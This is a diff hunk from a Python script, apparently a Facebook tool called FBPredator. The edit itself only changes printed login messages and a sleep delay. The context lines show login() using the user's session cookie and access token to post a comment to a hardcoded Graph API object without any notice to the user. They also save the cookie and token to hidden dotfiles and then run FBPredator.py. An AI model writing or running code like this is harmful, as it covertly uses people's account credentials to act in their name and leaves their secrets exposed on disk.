@@ -237,11 +237,11 @@ def login():
 		ses.post(f"https://graph.facebook.com/571109557964638/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
-		print(f"[{H}✓{P}] Login ({H}Success{P})\n {H}->{P} Cookie Valid\n {H}->{P} Processing...")
-		time.sleep(2)
+		print(f"\n[{H}✓{P}] Login ({H}Success{P})\n {H}->{P} Cookie Valid\n {H}->{P} Processing...")
+		time.sleep(3)
 		os.system("python FBPredator.py")
 	except Exception as e:
-		exit(f"[{M}!{P}] Login ({M}Failed{P})\n {M}->{P} Cookie Invalid")
+		exit(f"\n[{M}!{P}] Login ({M}Failed{P})\n {M}->{P} Cookie Invalid")
 
 def remove():
 	try:os.remove('.cookie.txt');os.remove('.token.txt')
